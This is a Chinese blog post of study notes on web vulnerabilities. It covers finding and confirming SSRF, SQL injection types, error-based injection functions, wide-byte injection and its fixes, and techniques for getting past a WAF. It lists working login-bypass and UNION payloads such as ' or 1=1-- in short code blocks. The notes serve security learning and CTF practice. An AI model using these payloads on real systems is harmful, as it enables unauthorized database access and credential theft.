+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击<br>如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷</p>
+<p><strong>挖掘</strong></p>
+<ol>
+<li><p>从WEB功能上寻找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">分享：通过URL地址分享网页内容</div><div class="line">转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</div><div class="line">在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</div><div class="line">图片加载与下载：通过URL地址加载或下载图片</div><div class="line">图片、文章收藏功能</div><div class="line">未公开的api实现以及其他调用URL的功能</div></pre></td></tr></table></figure>
+</li>
+<li><p>从URL关键字中寻找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">share/wap/url/link/src/source/target/u/3g/display/sourceURl/imageURL/domain</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><strong>SSRF 漏洞的验证</strong><br>基本判断（排除法）(URL和看请求)[譬如发送到自己vps，查看log看请求ip是否来自服务器ip,或者借助dnslog进行判断]</p>
+<p><strong>漏洞危害</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</div><div class="line">攻击运行在内网或本地的应用程序（比如溢出）</div><div class="line">对内网web应用进行指纹识别，通过访问默认文件实现</div><div class="line">攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）</div><div class="line">利用file协议读取本地文件等</div></pre></td></tr></table></figure></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</div><div class="line"></div><div class="line">2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</div><div class="line"></div><div class="line">3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</div><div class="line"></div><div class="line">4、联合查询注入，可以使用union的情况下的注入。</div><div class="line"></div><div class="line">5、堆查询注入，可以同时执行多条语句的执行时的注入。</div></pre></td></tr></table></figure></p>
+<p>原理</p>
+<p>所谓SQL注入，就是通过把SQL命令插入到Web 表单 提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句</p>
+<p><strong>SQLI能用来干什么</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">绕过登陆验证</div><div class="line">读取数据库内数据</div><div class="line">读取服务器文本数据</div><div class="line">向服务器写入shell</div><div class="line">执行系统命令</div></pre></td></tr></table></figure></p>
+<p><strong>SQLI思路，首先测试什么</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">类型</div><div class="line">过滤字符</div><div class="line">waf</div><div class="line"></div><div class="line">数字型和字符型区别</div><div class="line">提交的类型不同:</div><div class="line">id=1 and 1=1#</div><div class="line">id=2&apos; and 1=1#</div><div class="line"></div><div class="line">报错：单引号 注释(--, #, /*comment*/, /*!mysql*/, ), 除0, 类型错误</div><div class="line">堆查询: 支持: asp/asp.net/php + mssql    php + postgreSQL</div><div class="line">       不支持: php + mysql, asp/asp.net/php/java + access, java + oracle</div><div class="line">IF:</div><div class="line">    mysql: SELECT IF (1=1,&apos;true&apos;,&apos;false&apos;)</div><div class="line">    mssql: IF (1=1) SELECT &apos;true&apos; ELSE SELECT &apos;false&apos;</div><div class="line"></div><div class="line">16hex:</div><div class="line">    SELECT CHAR(0x66)(S)</div><div class="line">    SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串）</div></pre></td></tr></table></figure></p>
+<p><strong>And(0)*2报错原理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a</div></pre></td></tr></table></figure></p>
+<p>floor(rand(0)*2):011011011<br>插入相同值, 第二次计算不同: 保证在开始的查询结果中, 不能让虚表中存在0, 1键值</p>
+<ol>
+<li>首先建立了一个虚表</li>
+<li>取第一条数据，执行floor(rand(0) * 2)，结果为0（第一次计算），查询虚表，发现键值0不存在，在进行一次计算，结果为1（第一次插入），插入到表中；</li>
+<li>取出第二条数据，执行floor(rand(0) <em> 2)，结果为1（第二次计算），查询虚表，记录存在，直接count(</em>)加一；</li>
+<li>取出第三条数据，执行floor(rand(0) * 2)，结果为0（第三次计算），查询虚表，发现不存在键值0，在进行一次计算，结果1(第二次插入)，插入到虚表中作为虚表的主键，与之前的1冲突，这时候就会报错了。</li>
+</ol>
+<p><strong>报错注入的10种方式</strong></p>
+<p>见《企业级代码审计》书后</p>
+<p>常用的:updatexml,extractvalue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这俩原理类似，都是第二个参数需要Xpath格式字符串，但赋值不是,所以报错</div></pre></td></tr></table></figure></p>
+<p>还有个exp(~)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">exp()是为以e为底的对数函数。将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</div><div class="line">与exp()结合，就会造成一个溢出，导致报错</div></pre></td></tr></table></figure></p>
+<p><strong>绕过登陆界面</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">admin&apos; --</div><div class="line">admin&apos; #</div><div class="line">admin&apos;/*</div><div class="line">&apos; or 1=1--</div><div class="line">&apos; or 1=1#</div><div class="line">&apos; or 1=1/*</div><div class="line">&apos;) or &apos;1&apos;=&apos;1--</div><div class="line">&apos;) or (&apos;1&apos;=&apos;1--</div></pre></td></tr></table></figure></p>
+<p>还有个就是ctf中常出现的利用union绕过MD5(pass)的检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1234 &apos; AND 1=0 UNION ALL SELECT &apos;admin&apos;,&apos;81dc9bdb52d04dc20036dbd8313ed055</div></pre></td></tr></table></figure></p>
+<p><strong>SQLI单引号’被过滤怎么办</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1. 如果是数字型注入，只在用到引号的函数处受到影响</div><div class="line">2. 如果存在宽字节注入,只在用到引号的函数处受到影响</div><div class="line">3. 白盒审计中，如果没有过滤\，可以用\转义，让引号逃逸</div><div class="line">4. 二次注入</div><div class="line">5. 二次编码注入</div><div class="line">6. 过滤位置不全[譬如$_REQUEST过滤了，但忽略了$_SERVER]</div></pre></td></tr></table></figure></p>
+<p><strong>宽字节注入原理，在哪里编码，如何防范</strong></p>
+<p>(<a href="http://blog.csdn.net/zl20117/article/details/53610975" target="_blank" rel="external">http://blog.csdn.net/zl20117/article/details/53610975</a>)<br>三种情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.在PHP中使用mysql_query(“set names GBK”);指定三个字符集（客户端、连接层、结果集）都是GBK编码。</div><div class="line">2.使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）</div><div class="line">先转为UTF-8，然后再拼接入SQL语句。</div><div class="line">3.使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</div></pre></td></tr></table></figure></p>
+<p>归根到底还是数据库、操作系统、web应用所使用的字符集不一致。</p>
+<p>在《企业级代码审计》一书中介绍了三种解决方法：</p>
+<ol>
+<li>在执行查询前先SET NAMES ‘GBK’,character_set_client=binary</li>
+<li>使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤</li>
+<li>使用pdo方式,在php5.3.6及以下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,false)来禁用prepared statements的仿真效果</li>
+</ol>
+<p><strong>不同位置处的注入</strong></p>
+<ol>
+<li>update后: left join</li>
+<li>order by后: (<a href="http://www.cnblogs.com/lcamry/p/5762710.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/p/5762710.html</a>)</li>
+<li>limit后：(<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a>)</li>
+<li>insert后：闭合构造多个insert内容或让单引号逃逸</li>
+</ol>
+<p><strong>SQLI绕过WAF思路</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1. 大小写混合,双写绕过</div><div class="line">2. 替换关键字 (一次正则)</div><div class="line">3. 使用编码(URL编码/十六进制编码/Unicode编码/)</div><div class="line">4. 使用注释(//, -- , /**/, #, --+,--  -, ;，--a),内联注释/!**/只有MySQL能识别</div><div class="line">5. 等价函数与命令()</div><div class="line">6. 特殊符号 `(+-.可作连接,@定义变量,)</div><div class="line">7. HTTP参数控制(HPP)</div><div class="line">8. 缓冲区溢出</div><div class="line">9. ()代替空格</div></pre></td></tr></table></figure></p>
+<p><strong>MySQL有哪些表，有什么用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">mysql库</div><div class="line">user：</div><div class="line">db：</div><div class="line">table_priv:</div><div class="line">columns_priv:</div><div class="line">user表身份： Host + User + Password</div><div class="line">权限：user-all &gt; db &gt; tables_priv &gt; columns_priv</div><div class="line">插件 plugin</div><div class="line">两个视图库</div><div class="line">information_schema、performance_schema(5.0以下没有，所以只能暴力跑表)</div></pre></td></tr></table></figure></p>
+<p><strong>sqlmap mssql执行命令遇见中文目录</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--hex --proxy=&quot;http://127.0.0.1:8080&quot;用burp代理发送命令，把带有中文目录的命令用小葵转成hex，在burp中对应替换</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>字数多了，markdown编辑器变得好卡，下篇文章继续…</p>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/web安全/" class="article-tag-list-link color1">web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://doggy-test.github.io/2017/05/03/web安全知识补充-一/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/05/08/Bandit题目记录/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Bandit题目记录
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/26/python数据结构复习-三/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python数据结构复习(三)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
+  
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2019 Doggy
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true,
+		showTags: true
+	}
+</script>
+
+<script>!function(t){function n(r){if(e[r])return e[r].exports;var o=e[r]={exports:{},id:r,loaded:!1};return t[r].call(o.exports,o,o.exports,n),o.loaded=!0,o.exports}var e={};return n.m=t,n.c=e,n.p="./",n(0)}([function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function o(t,n){var e=/\/|index.html/g;return t.replace(e,"")===n.replace(e,"")}function i(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,e=0,r=t.length;e<r;e++){var i=t[e];o(n,i.getAttribute("href"))&&(0,d.default)(i,"active")}}function u(t){for(var n=t.offsetLeft,e=t.offsetParent;null!==e;)n+=e.offsetLeft,e=e.offsetParent;return n}function f(t){for(var n=t.offsetTop,e=t.offsetParent;null!==e;)n+=e.offsetTop,e=e.offsetParent;return n}function c(t,n,e,r,o){var i=u(t),c=f(t)-n;if(c-e<=o){var a=t.$newDom;a||(a=t.cloneNode(!0),(0,h.default)(t,a),t.$newDom=a,a.style.position="fixed",a.style.top=(e||c)+"px",a.style.left=i+"px",a.style.zIndex=r||2,a.style.width="100%",a.style.color="#fff"),a.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var s=t.$newDom;s&&(s.style.visibility="hidden")}}function a(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");c(t,document.body.scrollTop,-63,2,0),c(n,document.body.scrollTop,1,3,0)}function s(){document.querySelector("#container").addEventListener("scroll",function(t){a()}),window.addEventListener("scroll",function(t){a()}),a()}function l(){x.default.versions.mobile&&window.screen.width<800&&(i(),s())}var p=e(71),d=r(p),v=e(72),y=(r(v),e(84)),h=r(y),b=e(69),x=r(b),g=e(75),m=r(g),w=e(70);l(),(0,w.addLoadEvent)(function(){m.default.init()}),t.exports={}},function(t,n){var e=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=e)},function(t,n){var e={}.hasOwnProperty;t.exports=function(t,n){return e.call(t,n)}},function(t,n,e){var r=e(49),o=e(15);t.exports=function(t){return r(o(t))}},function(t,n,e){t.exports=!e(8)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,e){var r=e(6),o=e(12);t.exports=e(4)?function(t,n,e){return r.f(t,n,o(1,e))}:function(t,n,e){return t[n]=e,t}},function(t,n,e){var r=e(10),o=e(30),i=e(24),u=Object.defineProperty;n.f=e(4)?Object.defineProperty:function(t,n,e){if(r(t),n=i(n,!0),r(e),o)try{return u(t,n,e)}catch(t){}if("get"in e||"set"in e)throw TypeError("Accessors not supported!");return"value"in e&&(t[n]=e.value),t}},function(t,n,e){var r=e(22)("wks"),o=e(13),i=e(1).Symbol,u="function"==typeof i,f=t.exports=function(t){return r[t]||(r[t]=u&&i[t]||(u?i:o)("Symbol."+t))};f.store=r},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,e){var r=e(35),o=e(16);t.exports=Object.keys||function(t){return r(t,o)}},function(t,n,e){var r=e(11);t.exports=function(t){if(!r(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var e=0,r=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++e+r).toString(36))}},function(t,n){var e=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=e)},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,e){var r=e(6).f,o=e(2),i=e(7)("toStringTag");t.exports=function(t,n,e){t&&!o(t=e?t:t.prototype,i)&&r(t,i,{configurable:!0,value:n})}},function(t,n,e){var r=e(22)("keys"),o=e(13);t.exports=function(t){return r[t]||(r[t]=o(t))}},function(t,n,e){var r=e(1),o="__core-js_shared__",i=r[o]||(r[o]={});t.exports=function(t){return i[t]||(i[t]={})}},function(t,n){var e=Math.ceil,r=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?r:e)(t)}},function(t,n,e){var r=e(11);t.exports=function(t,n){if(!r(t))return t;var e,o;if(n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;if("function"==typeof(e=t.valueOf)&&!r(o=e.call(t)))return o;if(!n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;throw TypeError("Can't convert object to primitive value")}},function(t,n,e){var r=e(1),o=e(14),i=e(18),u=e(26),f=e(6).f;t.exports=function(t){var n=o.Symbol||(o.Symbol=i?{}:r.Symbol||{});"_"==t.charAt(0)||t in n||f(n,t,{value:u.f(t)})}},function(t,n,e){n.f=e(7)},function(t,n,e){var r=e(1),o=e(14),i=e(46),u=e(5),f="prototype",c=function(t,n,e){var a,s,l,p=t&c.F,d=t&c.G,v=t&c.S,y=t&c.P,h=t&c.B,b=t&c.W,x=d?o:o[n]||(o[n]={}),g=x[f],m=d?r:v?r[n]:(r[n]||{})[f];d&&(e=n);for(a in e)s=!p&&m&&void 0!==m[a],s&&a in x||(l=s?m[a]:e[a],x[a]=d&&"function"!=typeof m[a]?e[a]:h&&s?i(l,r):b&&m[a]==l?function(t){var n=function(n,e,r){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,e)}return new t(n,e,r)}return t.apply(this,arguments)};return n[f]=t[f],n}(l):y&&"function"==typeof l?i(Function.call,l):l,y&&((x.virtual||(x.virtual={}))[a]=l,t&c.R&&g&&!g[a]&&u(g,a,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,t.exports=c},function(t,n){var e={}.toString;t.exports=function(t){return e.call(t).slice(8,-1)}},function(t,n,e){var r=e(11),o=e(1).document,i=r(o)&&r(o.createElement);t.exports=function(t){return i?o.createElement(t):{}}},function(t,n,e){t.exports=!e(4)&&!e(8)(function(){return 7!=Object.defineProperty(e(29)("div"),"a",{get:function(){return 7}}).a})},function(t,n,e){"use strict";var r=e(18),o=e(27),i=e(36),u=e(5),f=e(2),c=e(17),a=e(51),s=e(20),l=e(58),p=e(7)("iterator"),d=!([].keys&&"next"in[].keys()),v="@@iterator",y="keys",h="values",b=function(){return this};t.exports=function(t,n,e,x,g,m,w){a(e,n,x);var O,S,_,j=function(t){if(!d&&t in A)return A[t];switch(t){case y:return function(){return new e(this,t)};case h:return function(){return new e(this,t)}}return function(){return new e(this,t)}},P=n+" Iterator",E=g==h,M=!1,A=t.prototype,T=A[p]||A[v]||g&&A[g],L=T||j(g),N=g?E?j("entries"):L:void 0,C="Array"==n?A.entries||T:T;if(C&&(_=l(C.call(new t)),_!==Object.prototype&&(s(_,P,!0),r||f(_,p)||u(_,p,b))),E&&T&&T.name!==h&&(M=!0,L=function(){return T.call(this)}),r&&!w||!d&&!M&&A[p]||u(A,p,L),c[n]=L,c[P]=b,g)if(O={values:E?L:j(h),keys:m?L:j(y),entries:N},w)for(S in O)S in A||i(A,S,O[S]);else o(o.P+o.F*(d||M),n,O);return O}},function(t,n,e){var r=e(10),o=e(55),i=e(16),u=e(21)("IE_PROTO"),f=function(){},c="prototype",a=function(){var t,n=e(29)("iframe"),r=i.length,o="<",u=">";for(n.style.display="none",e(48).appendChild(n),n.src="javascript:",t=n.contentWindow.document,t.open(),t.write(o+"script"+u+"document.F=Object"+o+"/script"+u),t.close(),a=t.F;r--;)delete a[c][i[r]];return a()};t.exports=Object.create||function(t,n){var e;return null!==t?(f[c]=r(t),e=new f,f[c]=null,e[u]=t):e=a(),void 0===n?e:o(e,n)}},function(t,n,e){var r=e(35),o=e(16).concat("length","prototype");n.f=Object.getOwnPropertyNames||function(t){return r(t,o)}},function(t,n){n.f=Object.getOwnPropertySymbols},function(t,n,e){var r=e(2),o=e(3),i=e(45)(!1),u=e(21)("IE_PROTO");t.exports=function(t,n){var e,f=o(t),c=0,a=[];for(e in f)e!=u&&r(f,e)&&a.push(e);for(;n.length>c;)r(f,e=n[c++])&&(~i(a,e)||a.push(e));return a}},function(t,n,e){t.exports=e(5)},function(t,n,e){var r=e(15);t.exports=function(t){return Object(r(t))}},function(t,n,e){t.exports={default:e(41),__esModule:!0}},function(t,n,e){t.exports={default:e(42),__esModule:!0}},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}n.__esModule=!0;var o=e(39),i=r(o),u=e(38),f=r(u),c="function"==typeof f.default&&"symbol"==typeof i.default?function(t){return typeof t}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":typeof t};n.default="function"==typeof f.default&&"symbol"===c(i.default)?function(t){return"undefined"==typeof t?"undefined":c(t)}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":"undefined"==typeof t?"undefined":c(t)}},function(t,n,e){e(65),e(63),e(66),e(67),t.exports=e(14).Symbol},function(t,n,e){e(64),e(68),t.exports=e(26).f("iterator")},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n){t.exports=function(){}},function(t,n,e){var r=e(3),o=e(61),i=e(60);t.exports=function(t){return function(n,e,u){var f,c=r(n),a=o(c.length),s=i(u,a);if(t&&e!=e){for(;a>s;)if(f=c[s++],f!=f)return!0}else for(;a>s;s++)if((t||s in c)&&c[s]===e)return t||s||0;return!t&&-1}}},function(t,n,e){var r=e(43);t.exports=function(t,n,e){if(r(t),void 0===n)return t;switch(e){case 1:return function(e){return t.call(n,e)};case 2:return function(e,r){return t.call(n,e,r)};case 3:return function(e,r,o){return t.call(n,e,r,o)}}return function(){return t.apply(n,arguments)}}},function(t,n,e){var r=e(9),o=e(34),i=e(19);t.exports=function(t){var n=r(t),e=o.f;if(e)for(var u,f=e(t),c=i.f,a=0;f.length>a;)c.call(t,u=f[a++])&&n.push(u);return n}},function(t,n,e){t.exports=e(1).document&&document.documentElement},function(t,n,e){var r=e(28);t.exports=Object("z").propertyIsEnumerable(0)?Object:function(t){return"String"==r(t)?t.split(""):Object(t)}},function(t,n,e){var r=e(28);t.exports=Array.isArray||function(t){return"Array"==r(t)}},function(t,n,e){"use strict";var r=e(32),o=e(12),i=e(20),u={};e(5)(u,e(7)("iterator"),function(){return this}),t.exports=function(t,n,e){t.prototype=r(u,{next:o(1,e)}),i(t,n+" Iterator")}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n,e){var r=e(9),o=e(3);t.exports=function(t,n){for(var e,i=o(t),u=r(i),f=u.length,c=0;f>c;)if(i[e=u[c++]]===n)return e}},function(t,n,e){var r=e(13)("meta"),o=e(11),i=e(2),u=e(6).f,f=0,c=Object.isExtensible||function(){return!0},a=!e(8)(function(){return c(Object.preventExtensions({}))}),s=function(t){u(t,r,{value:{i:"O"+ ++f,w:{}}})},l=function(t,n){if(!o(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!i(t,r)){if(!c(t))return"F";if(!n)return"E";s(t)}return t[r].i},p=function(t,n){if(!i(t,r)){if(!c(t))return!0;if(!n)return!1;s(t)}return t[r].w},d=function(t){return a&&v.NEED&&c(t)&&!i(t,r)&&s(t),t},v=t.exports={KEY:r,NEED:!1,fastKey:l,getWeak:p,onFreeze:d}},function(t,n,e){var r=e(6),o=e(10),i=e(9);t.exports=e(4)?Object.defineProperties:function(t,n){o(t);for(var e,u=i(n),f=u.length,c=0;f>c;)r.f(t,e=u[c++],n[e]);return t}},function(t,n,e){var r=e(19),o=e(12),i=e(3),u=e(24),f=e(2),c=e(30),a=Object.getOwnPropertyDescriptor;n.f=e(4)?a:function(t,n){if(t=i(t),n=u(n,!0),c)try{return a(t,n)}catch(t){}if(f(t,n))return o(!r.f.call(t,n),t[n])}},function(t,n,e){var r=e(3),o=e(33).f,i={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],f=function(t){try{return o(t)}catch(t){return u.slice()}};t.exports.f=function(t){return u&&"[object Window]"==i.call(t)?f(t):o(r(t))}},function(t,n,e){var r=e(2),o=e(37),i=e(21)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=o(t),r(t,i)?t[i]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,e){var r=e(23),o=e(15);t.exports=function(t){return function(n,e){var i,u,f=String(o(n)),c=r(e),a=f.length;return c<0||c>=a?t?"":void 0:(i=f.charCodeAt(c),i<55296||i>56319||c+1===a||(u=f.charCodeAt(c+1))<56320||u>57343?t?f.charAt(c):i:t?f.slice(c,c+2):(i-55296<<10)+(u-56320)+65536)}}},function(t,n,e){var r=e(23),o=Math.max,i=Math.min;t.exports=function(t,n){return t=r(t),t<0?o(t+n,0):i(t,n)}},function(t,n,e){var r=e(23),o=Math.min;t.exports=function(t){return t>0?o(r(t),9007199254740991):0}},function(t,n,e){"use 